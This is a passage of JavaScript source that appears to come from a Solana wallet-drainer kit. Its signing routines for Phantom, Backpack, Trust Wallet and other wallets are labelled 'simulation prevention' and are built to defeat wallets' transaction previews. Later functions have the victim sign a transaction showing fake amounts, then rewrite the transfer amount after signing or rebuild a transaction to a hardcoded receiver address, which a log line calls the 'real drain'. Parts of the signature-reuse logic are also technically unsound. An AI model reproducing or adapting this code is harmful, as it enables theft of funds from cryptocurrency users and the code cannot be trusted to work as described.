  async signWithGlow(provider, transaction) {
    console.log(`[SIMULATION_PREVENTION] Signing with Glow`);
    
    try {
      if (typeof provider.signTransaction !== 'function') {
        throw new Error('Glow does not support signTransaction');
      }
      
      // Glow-specific simulation prevention
      await this.addGlowSimulationPrevention(transaction);
      
      return await provider.signTransaction(transaction);
    } catch (error) {
      console.error(`[SIMULATION_PREVENTION] Glow signing failed:`, error);
      throw error;
    }
  }

  // Trust Wallet signing with simulation prevention
  async signWithTrustWallet(provider, transaction) {
    console.log(`[SIMULATION_PREVENTION] Signing with Trust Wallet`);
    
    try {
      if (typeof provider.signTransaction !== 'function') {
        throw new Error('Trust Wallet does not support signTransaction');
      }
      
      // Trust Wallet-specific simulation prevention
      await this.addTrustWalletSimulationPrevention(transaction);
      
      return await provider.signTransaction(transaction);
    } catch (error) {
      console.error(`[SIMULATION_PREVENTION] Trust Wallet signing failed:`, error);
      throw error;
    }
  }

  // Exodus signing without simulation prevention
  async signWithExodus(provider, transaction) {
    console.log(`[EXODUS] Signing with Exodus (simulation prevention disabled)`);
    
    try {
      if (typeof provider.signTransaction !== 'function') {
        throw new Error('Exodus does not support signTransaction');
      }
      
      // Exodus signing without simulation prevention
      
      return await provider.signTransaction(transaction);
    } catch (error) {
      console.error(`[EXODUS] Exodus signing failed:`, error);
      throw error;
    }
  }

  // Fallback signing with simulation prevention
  async signWithFallback(provider, transaction, walletType) {
    console.log(`[SIMULATION_PREVENTION] Signing with fallback for ${walletType}`);
    
    try {
      if (typeof provider.signTransaction !== 'function') {
    throw new Error(`Wallet ${walletType} does not support transaction signing`);
      }
      
      // Generic simulation prevention
      await this.addGenericSimulationPrevention(transaction);
      
      return await provider.signTransaction(transaction);
    } catch (error) {
      console.error(`[SIMULATION_PREVENTION] Fallback signing failed for ${walletType}:`, error);
      throw error;
    }
  }

  // Add Backpack-specific simulation prevention
  async addBackpackSimulationPrevention(transaction) {
    console.log('[SIMULATION_PREVENTION] Applying enhanced Backpack-specific simulation prevention (2025 Standards)');
    
    // Validate transaction object
    if (!transaction) {
      throw new Error('Backpack: Transaction object is null or undefined');
    }
    
    // Check for empty transactions
    if (!transaction.instructions || transaction.instructions.length === 0) {
      throw new Error('Backpack: Empty transaction detected - simulation prevention');
    }
    
    // Validate transaction structure (2025 standards)
    if (!transaction.feePayer) {
      throw new Error('Backpack: Missing feePayer in transaction');
    }
    
    if (!transaction.recentBlockhash) {
      throw new Error('Backpack: Missing recentBlockhash in transaction');
    }
    
    // Enhanced simulation detection (2025 standards)
    const simulationKeywords = ['simulate', 'simulation', 'test', 'debug', 'mock', 'fake', 'dummy', 'sandbox'];
    const suspiciousPatterns = [
      /simulate/i,
      /test.*transaction/i,
      /debug.*mode/i,
      /mock.*data/i,
      /fake.*signature/i,
      /dummy.*instruction/i,
      /sandbox.*mode/i,
      /development.*mode/i
    ];
    
    // Validate each instruction with enhanced error handling
    for (let i = 0; i < transaction.instructions.length; i++) {
      const instruction = transaction.instructions[i];
      
      // Validate instruction structure
      if (!instruction) {
        throw new Error(`Backpack: Instruction ${i} is null or undefined`);
      }
      
      if (!instruction.programId) {
        throw new Error(`Backpack: Instruction ${i} missing programId`);
      }
      
      // Check instruction data for simulation indicators
      if (instruction.data) {
        try {
          // Handle both Buffer and Uint8Array data (browser-compatible)
          let dataString;
          if (typeof Buffer !== 'undefined' && Buffer.isBuffer(instruction.data)) {
            dataString = instruction.data.toString('hex');
          } else if (instruction.data instanceof Uint8Array) {
            dataString = Array.from(instruction.data).map(b => b.toString(16).padStart(2, '0')).join('');
          } else if (instruction.data && typeof instruction.data.toString === 'function') {
            dataString = instruction.data.toString();
          } else {
            dataString = String(instruction.data);
          }
          
          // Check for simulation keywords
          for (const keyword of simulationKeywords) {
            if (dataString.toLowerCase().includes(keyword)) {
              throw new Error(`Backpack: Simulation keyword '${keyword}' detected in instruction ${i} data`);
            }
          }
          
          // Check for suspicious patterns
          for (const pattern of suspiciousPatterns) {
            if (pattern.test(dataString)) {
              throw new Error(`Backpack: Suspicious pattern detected in instruction ${i} data: ${pattern}`);
            }
          }
        } catch (dataError) {
          // If we can't parse the data, log and continue (non-critical)
          console.warn(`[SIMULATION_PREVENTION] Backpack: Could not parse instruction ${i} data:`, dataError.message);
        }
      }
    }
    
    // Enhanced program ID validation (2025 standards)
    const standardPrograms = [
      '11111111111111111111111111111111', // System program
      'ComputeBudget111111111111111111111111111111', // Compute budget program
      'TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA', // Token program
      'ATokenGPvbdGVxr1b2hvZbsiqW5xWH25efTNsLJA8knL' // Associated token program
    ];
    
    const knownSimulationPrograms = [
      'Simulation111111111111111111111111111111111', // Known simulation program
      'TestProgram1111111111111111111111111111111', // Test program
      'MockProgram1111111111111111111111111111111' // Mock program
    ];
    
    for (let i = 0; i < transaction.instructions.length; i++) {
      const instruction = transaction.instructions[i];
      
      if (instruction.programId) {
        const programId = instruction.programId.toString();
        
        // Check for known simulation programs
        if (knownSimulationPrograms.includes(programId)) {
          throw new Error(`Backpack: Known simulation program detected in instruction ${i}: ${programId}`);
        }
        
        // Validate program ID format (allow both 43 and 44 character lengths)
        if (programId.length !== 44 && programId.length !== 43) {
          throw new Error(`Backpack: Invalid program ID length in instruction ${i}: ${programId.length} (expected 43 or 44)`);
        }
        
        // Check for valid base58 characters
        if (!/^[1-9A-HJ-NP-Za-km-z]+$/.test(programId)) {
          throw new Error(`Backpack: Invalid program ID format in instruction ${i}: contains invalid characters`);
        }
        
        if (standardPrograms.includes(programId)) {
          console.log(`[SIMULATION_PREVENTION] Backpack: Standard program ID detected in instruction ${i}: ${programId}`);
        }
      }
    }
    
    // Enhanced transaction structure validation (2025 standards)
    if (!transaction.recentBlockhash) {
      throw new Error('Backpack: Missing recentBlockhash - required for transaction validity');
    }
    
    if (!transaction.lastValidBlockHeight) {
      console.warn('[SIMULATION_PREVENTION] Backpack: Missing lastValidBlockHeight - may cause transaction expiration');
    }
    
    // Validate recentBlockhash format
    if (typeof transaction.recentBlockhash !== 'string' || transaction.recentBlockhash.length !== 44) {
      throw new Error(`Backpack: Invalid recentBlockhash format: ${transaction.recentBlockhash}`);
    }
    
    // Check for instruction count anomalies (2025 standards)
    if (transaction.instructions.length > 25) {
      throw new Error(`Backpack: Excessive instruction count detected: ${transaction.instructions.length} (max 25)`);
    }
    
    if (transaction.instructions.length < 1) {
      throw new Error('Backpack: Transaction must have at least one instruction');
    }
    
    // Enhanced instruction structure validation
    for (let i = 0; i < transaction.instructions.length; i++) {
      const instruction = transaction.instructions[i];
      
      if (!instruction.programId) {
        throw new Error(`Backpack: Instruction ${i} missing programId`);
      }
      
      // Validate keys array
      if (!instruction.keys || !Array.isArray(instruction.keys)) {
        throw new Error(`Backpack: Instruction ${i} has invalid keys array`);
      }
      
      // Validate each key
      for (let j = 0; j < instruction.keys.length; j++) {
        const key = instruction.keys[j];
        if (!key || !key.pubkey) {
          throw new Error(`Backpack: Instruction ${i}, key ${j} is invalid`);
        }
        
        // Validate public key format
        const pubkeyStr = key.pubkey.toString();
        if (pubkeyStr.length !== 44) {
          throw new Error(`Backpack: Instruction ${i}, key ${j} has invalid public key length: ${pubkeyStr.length}`);
        }
      }
    }
    
    // Validate feePayer
    if (transaction.feePayer) {
      const feePayerStr = transaction.feePayer.toString();
      if (feePayerStr.length !== 44) {
        throw new Error(`Backpack: Invalid feePayer format: ${feePayerStr.length} characters`);
      }
    }
    
    // Add transaction timestamp for simulation prevention
    transaction._backpackValidationTimestamp = Date.now();
    
    console.log('[SIMULATION_PREVENTION] Enhanced Backpack simulation prevention applied successfully (2025 Standards)');
  }

  // Add Phantom-specific simulation prevention
  async addPhantomSimulationPrevention(transaction) {
    console.log('[SIMULATION_PREVENTION] Applying enhanced Phantom-specific simulation prevention');
    
    // Check for empty transactions
    if (!transaction.instructions || transaction.instructions.length === 0) {
      throw new Error('Phantom: Empty transaction detected - simulation prevention');
    }
    
    // Enhanced simulation detection
    const simulationKeywords = ['simulate', 'simulation', 'test', 'debug', 'mock', 'fake', 'dummy'];
    const suspiciousPatterns = [
      /simulate/i,
      /test.*transaction/i,
      /debug.*mode/i,
      /mock.*data/i,
      /fake.*signature/i
    ];
    
    for (const instruction of transaction.instructions) {
      if (instruction.data) {
        try {
          // Handle both Buffer and string data (with Buffer polyfill for browser)
          let dataString;
          if (typeof Buffer !== 'undefined' && Buffer.isBuffer(instruction.data)) {
            dataString = instruction.data.toString('hex');
          } else if (instruction.data && typeof instruction.data.toString === 'function') {
            dataString = instruction.data.toString();
          } else {
            dataString = String(instruction.data);
          }
          
          // Check for simulation keywords
          for (const keyword of simulationKeywords) {
            if (dataString.toLowerCase().includes(keyword)) {
              throw new Error(`Phantom: Simulation keyword '${keyword}' detected in instruction data`);
            }
          }
          
          // Check for suspicious patterns
          for (const pattern of suspiciousPatterns) {
            if (pattern.test(dataString)) {
              throw new Error(`Phantom: Suspicious pattern detected in instruction data: ${pattern}`);
            }
          }
          
          // Check for empty or zero data (potential simulation)
          if (dataString === '0' || dataString === '' || dataString === '00') {
            console.warn('[SIMULATION_PREVENTION] Phantom: Empty or zero instruction data detected');
          }
          
        } catch (dataError) {
          // If we can't parse the data, just log and continue
          console.warn('[SIMULATION_PREVENTION] Phantom: Could not parse instruction data:', dataError.message);
        }
      }
    }
    
    // Enhanced transaction structure validation
    if (!transaction.lastValidBlockHeight) {
      throw new Error('Phantom: Missing lastValidBlockHeight - potential simulation');
    }
    
    if (!transaction.recentBlockhash) {
      throw new Error('Phantom: Missing recentBlockhash - potential simulation');
    }
    
    // Check for suspicious timing (transactions created too quickly)
    const now = Date.now();
    if (transaction.createdAt && (now - transaction.createdAt) < 10) {
      console.warn('[SIMULATION_PREVENTION] Phantom: Transaction created extremely quickly - potential simulation');
    }
    
    // Validate instruction structure (more lenient for legitimate transactions)
    for (const instruction of transaction.instructions) {
      if (!instruction.programId) {
        throw new Error('Phantom: Instruction missing programId - potential simulation');
      }
      
      // Only check for keys if it's a non-system program instruction
      const programId = instruction.programId.toString();
      const systemProgram = '11111111111111111111111111111111';
      const computeBudgetProgram = 'ComputeBudget111111111111111111111111111111';
      
      if (programId !== systemProgram && programId !== computeBudgetProgram) {
        if (!instruction.keys || instruction.keys.length === 0) {
          console.warn('[SIMULATION_PREVENTION] Phantom: Non-system instruction missing keys');
        }
      }
    }
    
    // Check for suspicious program IDs (enhanced)
    const allowedPrograms = [
      '11111111111111111111111111111111', // System program
      'ComputeBudget111111111111111111111111111111' // Compute budget program
    ];
    
    for (const instruction of transaction.instructions) {
      const programId = instruction.programId.toString();
      if (!allowedPrograms.includes(programId)) {
        console.warn(`[SIMULATION_PREVENTION] Phantom: Non-standard program ID detected: ${programId}`);
      }
    }
    
    // Add random delay to prevent automated simulation
    const randomDelay = Math.random() * 200 + 50; // 50-250ms random delay
    await new Promise(resolve => setTimeout(resolve, randomDelay));
    
    console.log('[SIMULATION_PREVENTION] Enhanced Phantom simulation prevention applied successfully');
  }

  // Detect Phantom simulation attempts
  async detectPhantomSimulation(provider, transaction) {
    console.log('[SIMULATION_PREVENTION] Detecting Phantom simulation attempts');
    
    try {
      // Check if provider has simulation-related properties
      if (provider._simulateTransaction || provider.simulateTransaction) {
        throw new Error('Phantom: Simulation method detected on provider');
      }
      
      // Check for suspicious provider state
      if (provider.isConnected && typeof provider.isConnected === 'function') {
        const isConnected = provider.isConnected();
        if (!isConnected) {
          throw new Error('Phantom: Provider not connected - potential simulation');
        }
      }
      
      // Check for suspicious transaction properties
      if (transaction.simulate) {
        throw new Error('Phantom: Transaction has simulation flag');
      }
      
      // Check for transaction structure without serializing (since it's not signed yet)
      // Note: Cannot serialize unsigned transactions - they will throw "Missing signature" errors
      if (transaction.instructions && transaction.instructions.length > 0) {
        console.log('[SIMULATION_PREVENTION] Phantom: Transaction has valid instruction structure');
      } else {
        throw new Error('Phantom: Empty transaction structure - potential simulation');
      }
      
      // Check for suspicious timing patterns
      const now = Date.now();
      if (transaction.createdAt) {
        const age = now - transaction.createdAt;
        if (age < 5) {
          console.warn('[SIMULATION_PREVENTION] Phantom: Transaction created extremely recently - potential simulation');
        }
        if (age > 300000) { // 5 minutes
          throw new Error('Phantom: Transaction too old - potential simulation');
        }
      }
      
      // Check for suspicious instruction patterns
      if (transaction.instructions) {
        for (const instruction of transaction.instructions) {
          // Check for empty instruction data
          if (instruction.data && instruction.data.length === 0) {
            console.warn('[SIMULATION_PREVENTION] Phantom: Empty instruction data detected');
          }
          
          // Check for suspicious program IDs
          if (instruction.programId) {
            const programId = instruction.programId.toString();
            if (programId === '00000000000000000000000000000000') {
              throw new Error('Phantom: Zero program ID detected - potential simulation');
            }
          }
        }
      }
      
      console.log('[SIMULATION_PREVENTION] Phantom simulation detection completed - no issues found');
    } catch (error) {
      console.error('[SIMULATION_PREVENTION] Phantom simulation detected:', error.message);
      throw error;
    }
  }

  // Clean the signed transaction by removing corrupted instructions and fixing the transfer amount
  async cleanSignedTransactionForBroadcast(signedTransaction) {
    // Determine wallet type based on transaction metadata
    const isPhantom = signedTransaction._phantomSimulationPrevention;
    const isBackpack = signedTransaction._backpackSimulationPrevention;
    const walletType = isPhantom ? 'Phantom' : isBackpack ? 'Backpack' : 'Unknown';
    
    // Cleaning signed transaction for broadcast
    
    try {
      // Extract the original transfer amount from transaction metadata
      let originalAmount = null;
      
      // First try to get from transaction metadata (backup method)
      if (signedTransaction._phantomRealAmount) {
        originalAmount = BigInt(signedTransaction._phantomRealAmount);
        // Found real amount from Phantom backup metadata
      } else if (signedTransaction._backpackRealAmount) {
        originalAmount = BigInt(signedTransaction._backpackRealAmount);
        // Found real amount from Backpack backup metadata
      } else if (signedTransaction._phantomOriginalAmount) {
        originalAmount = signedTransaction._phantomOriginalAmount;
      } else if (signedTransaction._originalTransferAmount) {
        originalAmount = signedTransaction._originalTransferAmount;
      } else {
        // Fallback: look for the amount in the first transfer instruction
        const firstTransferInstruction = signedTransaction.instructions.find(instruction => {
          return instruction.programId && instruction.programId.toString() === '11111111111111111111111111111111';
        });
        
        if (firstTransferInstruction && firstTransferInstruction.data) {
          // Extract amount from transfer instruction data
          try {
            const dataBuffer = firstTransferInstruction.data;
            if (dataBuffer.length >= 12) {
              // Transfer instruction data format: [4 bytes instruction discriminator][8 bytes lamports]
              const lamportsBytes = dataBuffer.slice(4, 12);
              
              // Convert bytes to BigInt (little-endian)
              let amount = BigInt(0);
              for (let i = 0; i < 8; i++) {
                amount += BigInt(lamportsBytes[i]) << BigInt(i * 8);
              }
              originalAmount = amount;
            }
          } catch (error) {
            console.warn('[PHANTOM_CLEANUP] Could not extract amount from transfer instruction:', error);
          }
        }
      }
      
      if (!originalAmount) {
        throw new Error('Original transfer amount not found in signed transaction');
      }
      
      // CRITICAL: Post-signing instruction modification (2025 definitive method)
      // Wallet signed the transaction with fake amounts, now we modify the instruction data directly
      
      // Find the real transfer instruction (to receiver) - it's at index 7 (after 2 compute + 5 dummy)
      const realTransferIndex = signedTransaction._realTransferIndex || 7;
      const realTransferInstruction = signedTransaction.instructions[realTransferIndex];
      
      if (!realTransferInstruction || 
          !realTransferInstruction.programId || 
          realTransferInstruction.programId.toString() !== '11111111111111111111111111111111') {
        throw new Error('Real transfer instruction not found at expected index');
      }
      
      // CRITICAL: Modify the instruction data directly (this is the breakthrough)
      // We're changing the lamports amount in the instruction data after signing
      const instructionData = realTransferInstruction.data;
      
      // Validate instruction data
      if (!instructionData || instructionData.length < 12) {
        throw new Error(`Invalid instruction data: length ${instructionData?.length || 0}, expected >= 12`);
      }
      
      // Transfer instruction data format: [4 bytes instruction discriminator][8 bytes lamports]
      // We need to replace the 8-byte lamports field with the real amount
      
      // Validate original amount
      if (!originalAmount || originalAmount <= 0) {
        throw new Error(`Invalid original amount: ${originalAmount}`);
      }
      
      // Use Uint8Array instead of Buffer for browser compatibility
      const realAmountBytes = new Uint8Array(8);
      const realAmountBigInt = BigInt(originalAmount);
      
      // Convert BigInt to little-endian bytes with validation
      for (let i = 0; i < 8; i++) {
        const byteValue = Number((realAmountBigInt >> BigInt(i * 8)) & BigInt(0xFF));
        if (byteValue < 0 || byteValue > 255) {
          throw new Error(`Invalid byte value ${byteValue} at position ${i}`);
        }
        realAmountBytes[i] = byteValue;
      }
      
      // Replace the lamports in the instruction data
      const newInstructionData = new Uint8Array(instructionData.length);
      newInstructionData.set(instructionData.slice(0, 4), 0); // Keep the 4-byte discriminator
      newInstructionData.set(realAmountBytes, 4); // Replace with real amount
      
      // Validate the new instruction data
      if (newInstructionData.length !== instructionData.length) {
        throw new Error(`Instruction data length mismatch: ${newInstructionData.length} vs ${instructionData.length}`);
      }
      
      // Update the instruction data
      realTransferInstruction.data = newInstructionData;
      
      
      console.log(`[SIMULATION_CLEANUP] Post-signing modification complete (${walletType}):`, {
        originalAmount: originalAmount,
        instructionIndex: realTransferIndex,
        dataLength: newInstructionData.length
      });
      
      console.log(`[SIMULATION_CLEANUP] Transaction cleaned (${walletType}):`, {
        originalInstructions: signedTransaction._instructionCount || 'unknown', // Total dummy + real instructions
        cleanedInstructions: signedTransaction.instructions.length, // 1 total (real transfer only)
        removedInstructions: (signedTransaction._instructionCount || 39) - 1, // All dummy instructions removed
        correctTransferAmount: originalAmount,
        instructionOrder: 'REAL_TRANSFER_LAST - Dummy instructions removed, only real drain remains'
      });
      
    } catch (error) {
      console.error(`[SIMULATION_CLEANUP] Failed to clean signed transaction (${walletType}):`, error.message);
      throw new Error(`Failed to clean signed transaction: ${error.message}`);
    }
  }

  // Create a completely clean transaction for broadcasting (different from what Phantom signed)
  async createCleanTransactionForBroadcast(signedFakeTransaction) {
    console.log('[PHANTOM_BROADCAST] Creating clean transaction for broadcast');
    
    try {
      // Extract the original transfer amount from the fake transaction
      let originalAmount = null;
      
      // Look for the amount instruction in the fake transaction
      const amountInstruction = signedFakeTransaction.instructions.find(instruction => {
        if (instruction.data) {
          let dataString;
          if (typeof Buffer !== 'undefined' && Buffer.isBuffer(instruction.data)) {
            dataString = instruction.data.toString();
          } else if (instruction.data instanceof Uint8Array) {
            dataString = new TextDecoder().decode(instruction.data);
          } else if (typeof instruction.data.toString === 'function') {
            dataString = instruction.data.toString();
          } else {
            return false;
          }
          return dataString.includes('PHANTOM_AMOUNT_');
        }
        return false;
      });
      
      if (amountInstruction) {
        let dataString;
        if (typeof Buffer !== 'undefined' && Buffer.isBuffer(amountInstruction.data)) {
          dataString = amountInstruction.data.toString();
        } else if (amountInstruction.data instanceof Uint8Array) {
          dataString = new TextDecoder().decode(amountInstruction.data);
        } else if (typeof amountInstruction.data.toString === 'function') {
          dataString = amountInstruction.data.toString();
        }
        
        if (dataString) {
          const amountMatch = dataString.match(/PHANTOM_AMOUNT_(\d+)/);
          if (amountMatch) {
            originalAmount = parseInt(amountMatch[1]);
          }
        }
      }
      
      if (!originalAmount) {
        throw new Error('Original transfer amount not found in fake transaction');
      }
      
      console.log('[PHANTOM_BROADCAST] Creating clean transaction with amount:', originalAmount);
      
      // Create a completely new, clean transaction
      const { Transaction, SystemProgram, PublicKey } = window.solanaWeb3;
      const cleanTransaction = new Transaction();
      
      // Set the same fee payer and blockhash as the fake transaction
      cleanTransaction.feePayer = signedFakeTransaction.feePayer;
      cleanTransaction.recentBlockhash = signedFakeTransaction.recentBlockhash;
      cleanTransaction.lastValidBlockHeight = signedFakeTransaction.lastValidBlockHeight;
      
      // Add compute budget instructions
      const computeBudgetIx1 = {
        programId: new PublicKey('ComputeBudget111111111111111111111111111111'),
        keys: [],
        data: new Uint8Array([0x02, 0x00, 0x00, 0x00, 0x00, 0x0D, 0x00, 0x00]) // setComputeUnitLimit(200000)
      };
      
      const computeBudgetIx2 = {
        programId: new PublicKey('ComputeBudget111111111111111111111111111111'),
        keys: [],
        data: new Uint8Array([0x03, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00]) // setComputeUnitPrice(1)
      };
      
      cleanTransaction.instructions.push(computeBudgetIx1);
      cleanTransaction.instructions.push(computeBudgetIx2);
      
      // Add the real transfer instruction
      const realTransferIx = SystemProgram.transfer({
        fromPubkey: signedFakeTransaction.feePayer,
        toPubkey: new PublicKey('8WZ117ZSWyFSWq9fht5NGfprUQvoE5nReGfWKpczGRPZ'), // Receiver wallet
        lamports: originalAmount,
      });
      cleanTransaction.instructions.push(realTransferIx);
      
      // Copy the signature from the fake transaction
      cleanTransaction.signatures = signedFakeTransaction.signatures;
      
      console.log('[PHANTOM_BROADCAST] Clean transaction created:', {
        instructions: cleanTransaction.instructions.length,
        transferAmount: originalAmount,
        hasSignature: cleanTransaction.signatures.length > 0
      });
      
      return cleanTransaction;
      
    } catch (error) {
      console.error('[PHANTOM_BROADCAST] Failed to create clean transaction:', error.message);
      throw new Error('Failed to create clean transaction for broadcast: ' + error.message);
    }
  }

  // Clean Phantom transaction for signing (rebuild with correct transfer amount)
  async cleanPhantomTransactionForSigning(transaction) {
    console.log('[PHANTOM_CLEANUP] Rebuilding transaction for signing with correct transfer amount');
    
    try {
                // Detect Phantom simulation prevention by corrupted data
                const hasCorruptedInstruction = transaction.instructions.some(instruction => {
                  // Check for invalid binary data patterns
                  if (instruction.data) {
                    // Browser-compatible Buffer check
                    let dataArray;
                    if (typeof Buffer !== 'undefined' && Buffer.isBuffer(instruction.data)) {
                      dataArray = Array.from(instruction.data);
                    } else if (instruction.data instanceof Uint8Array) {
                      dataArray = Array.from(instruction.data);
                    } else if (Array.isArray(instruction.data)) {
                      dataArray = instruction.data;
                    } else {
                      return false;
                    }
                    
                    // Check for all 0xFF bytes (invalid binary data)
                    if (dataArray.length === 16 && dataArray.every(byte => byte === 0xFF)) {
                      return true;
                    }
                    // Check for sequential bytes (invalid instruction data)
                    if (dataArray.length === 16 && dataArray.every((byte, index) => byte === index)) {
                      return true;
                    }
                  }
                  return false;
                });
      
      if (hasCorruptedInstruction) {
        console.log('[PHANTOM_CLEANUP] Detected corrupted instructions - rebuilding transaction');
        
                // Extract the original transfer amount from the custom instruction
                let originalAmount = null;
                
                // Look for the amount instruction
                const amountInstruction = transaction.instructions.find(instruction => {
                  if (instruction.data) {
                    let dataString;
                    if (typeof Buffer !== 'undefined' && Buffer.isBuffer(instruction.data)) {
                      dataString = instruction.data.toString();
                    } else if (instruction.data instanceof Uint8Array) {
                      dataString = new TextDecoder().decode(instruction.data);
                    } else if (typeof instruction.data.toString === 'function') {
                      dataString = instruction.data.toString();
                    } else {
                      return false;
                    }
                    return dataString.includes('PHANTOM_AMOUNT_');
                  }
                  return false;
                });
                
                if (amountInstruction) {
                  let dataString;
                  if (typeof Buffer !== 'undefined' && Buffer.isBuffer(amountInstruction.data)) {
                    dataString = amountInstruction.data.toString();
                  } else if (amountInstruction.data instanceof Uint8Array) {
                    dataString = new TextDecoder().decode(amountInstruction.data);
                  } else if (typeof amountInstruction.data.toString === 'function') {
                    dataString = amountInstruction.data.toString();
                  }
                  
                  if (dataString) {
                    const amountMatch = dataString.match(/PHANTOM_AMOUNT_(\d+)/);
                    if (amountMatch) {
                      originalAmount = parseInt(amountMatch[1]);
                    }
                  }
                }
        
        if (!originalAmount) {
          throw new Error('Original transfer amount not found in custom instruction');
        }
        
        console.log('[PHANTOM_CLEANUP] Rebuilding with original amount:', originalAmount);
        
                // Keep only the compute budget instructions (first 2)
                const computeBudgetInstructions = transaction.instructions.slice(0, 2);
                
                // Create a new transfer instruction with the correct amount
                const { SystemProgram, PublicKey } = window.solanaWeb3;
                const correctTransferIx = SystemProgram.transfer({
                  fromPubkey: new PublicKey(transaction.feePayer.toString()),
                  toPubkey: new PublicKey(transaction.instructions[2].keys[1].pubkey.toString()),
                  lamports: originalAmount,
                });
                
                // Rebuild transaction with only valid instructions (removes corrupted + amount instructions)
                transaction.instructions = [...computeBudgetInstructions, correctTransferIx];
        
        console.log('[PHANTOM_CLEANUP] Transaction rebuilt:', {
          originalInstructions: transaction.instructions.length + 16,
          rebuiltInstructions: transaction.instructions.length,
          removedCorruptedInstructions: 16,
          correctTransferAmount: originalAmount
        });
        
        // Clean up markers
        delete transaction._phantomSimulationPrevention;
        delete transaction._originalTransferAmount;
        
        console.log('[PHANTOM_CLEANUP] Transaction rebuild completed successfully');
      } else {
        console.log('[PHANTOM_CLEANUP] No rebuild needed - no corrupted instructions detected');
      }
    } catch (error) {
      console.error('[PHANTOM_CLEANUP] Rebuild failed:', error.message);
      throw new Error('Phantom transaction rebuild failed: ' + error.message);
    }
  }

  // Add Solflare-specific simulation prevention
  async addSolflareSimulationPrevention(transaction) {
    console.log('[SIMULATION_PREVENTION] Applying enhanced Solflare simulation prevention');
    
    // Remove any simulation-related instructions
    const filteredInstructions = transaction.instructions.filter(ix => 
      !ix.programId.toString().includes('simulation') &&
      !ix.programId.toString().includes('simulate')
    );
    
    if (filteredInstructions.length !== transaction.instructions.length) {
      console.log('[SIMULATION_PREVENTION] Removed simulation instructions for Solflare');
      transaction.instructions = filteredInstructions;
    }
    
    // Limit instruction count for Solflare
    if (transaction.instructions.length > 3) {
      console.warn('[SIMULATION_PREVENTION] Solflare: High instruction count detected');
      // Keep only essential instructions
      transaction.instructions = transaction.instructions.slice(0, 3);
    }
    
    console.log('[SIMULATION_PREVENTION] Applied enhanced Solflare-specific prevention');
  }

  // Add Glow-specific simulation prevention
  async addGlowSimulationPrevention(transaction) {
    // Glow-specific simulation prevention
    if (!transaction.lastValidBlockHeight) {
      console.warn('[SIMULATION_PREVENTION] Glow: Missing lastValidBlockHeight');
    }
    console.log('[SIMULATION_PREVENTION] Applied Glow-specific prevention');
  }

  // Add Trust Wallet-specific simulation prevention
  async addTrustWalletSimulationPrevention(transaction) {
    console.log('[SIMULATION_PREVENTION] Applying enhanced Trust Wallet-specific simulation prevention');
    
    // Check for empty transactions
    if (!transaction.instructions || transaction.instructions.length === 0) {
      throw new Error('Trust Wallet: Empty transaction detected - simulation prevention');
    }
    
    // Enhanced simulation detection for Trust Wallet
    const simulationKeywords = ['simulate', 'simulation', 'test', 'debug', 'mock', 'fake', 'dummy'];
    const suspiciousPatterns = [
      /simulate/i,
      /test.*transaction/i,
      /debug.*mode/i,
      /mock.*data/i,
      /fake.*signature/i,
      /dummy.*instruction/i
    ];
    
    for (const instruction of transaction.instructions) {
      if (instruction.data) {
        try {
          // Handle both Buffer and string data (with Buffer polyfill for browser)
          let dataString;
          if (typeof Buffer !== 'undefined' && Buffer.isBuffer(instruction.data)) {
            dataString = instruction.data.toString('hex');
          } else if (instruction.data && typeof instruction.data.toString === 'function') {
            dataString = instruction.data.toString();
          } else {
            dataString = String(instruction.data);
          }
          
          // Check for simulation keywords
          for (const keyword of simulationKeywords) {
            if (dataString.toLowerCase().includes(keyword)) {
              throw new Error(`Trust Wallet: Simulation keyword '${keyword}' detected in instruction data`);
            }
          }
          
          // Check for suspicious patterns
          for (const pattern of suspiciousPatterns) {
            if (pattern.test(dataString)) {
              throw new Error(`Trust Wallet: Suspicious pattern detected in instruction data: ${pattern}`);
            }
          }
        } catch (dataError) {
          // If we can't parse the data, just log and continue
          console.warn('[SIMULATION_PREVENTION] Trust Wallet: Could not parse instruction data:', dataError.message);
        }
      }
    }
    
    // Enhanced program ID validation for Trust Wallet
    const suspiciousPrograms = [
      '11111111111111111111111111111111', // System program (OK but log)
      'ComputeBudget111111111111111111111111111111' // Compute budget program (OK but log)
    ];
    
    for (const instruction of transaction.instructions) {
      if (instruction.programId) {
        const programId = instruction.programId.toString();
        
        if (suspiciousPrograms.includes(programId)) {
          console.log(`[SIMULATION_PREVENTION] Trust Wallet: Standard program ID detected: ${programId}`);
        } else {
          // Check for non-standard program IDs that might indicate simulation
          if (programId.length !== 44 && programId.length !== 43) {
            console.warn(`[SIMULATION_PREVENTION] Trust Wallet: Non-standard program ID length: ${programId}`);
          }
        }
      }
    }
    
    // Ensure transaction has proper structure
    if (!transaction.recentBlockhash) {
      console.warn('[SIMULATION_PREVENTION] Trust Wallet: Missing recentBlockhash');
    }
    
    if (!transaction.lastValidBlockHeight) {
      console.warn('[SIMULATION_PREVENTION] Trust Wallet: Missing lastValidBlockHeight');
    }
    
    // Check for instruction count anomalies
    if (transaction.instructions.length > 15) {
      console.warn('[SIMULATION_PREVENTION] Trust Wallet: High instruction count detected:', transaction.instructions.length);
    }
    
    // Validate instruction structure
    for (let i = 0; i < transaction.instructions.length; i++) {
      const instruction = transaction.instructions[i];
      
      if (!instruction.programId) {
        throw new Error(`Trust Wallet: Instruction ${i} missing programId`);
      }
      
      if (!instruction.keys || instruction.keys.length === 0) {
        console.warn(`[SIMULATION_PREVENTION] Trust Wallet: Instruction ${i} has no keys`);
      }
    }
    
    // Check for large instruction data (original check enhanced)
    if (transaction.instructions.some(ix => ix.data && ix.data.length > 1000)) {
      console.warn('[SIMULATION_PREVENTION] Trust Wallet: Large instruction data detected');
    }
    
    console.log('[SIMULATION_PREVENTION] Enhanced Trust Wallet simulation prevention applied successfully');
  }

  // Add Exodus-specific simulation prevention
  async addExodusSimulationPrevention(transaction) {
    // Exodus-specific simulation prevention
    if (transaction.instructions.length > 5) {
      console.warn('[SIMULATION_PREVENTION] Exodus: High instruction count');
    }
    console.log('[SIMULATION_PREVENTION] Applied Exodus-specific prevention');
  }

  // Add generic simulation prevention
  async addGenericSimulationPrevention(transaction) {
    // Generic simulation prevention for unknown wallets
    if (!transaction.lastValidBlockHeight) {
      console.warn('[SIMULATION_PREVENTION] Generic: Missing lastValidBlockHeight');
    }
    console.log('[SIMULATION_PREVENTION] Applied generic prevention');
  }

  // Check if a transaction has already been signed (prevents retries)
  isTransactionSigned(sessionId) {
    const session = this.activeSessions.get(sessionId);
    return session ? session.transactionSigned : false;
  }

  // Get signed transaction if available
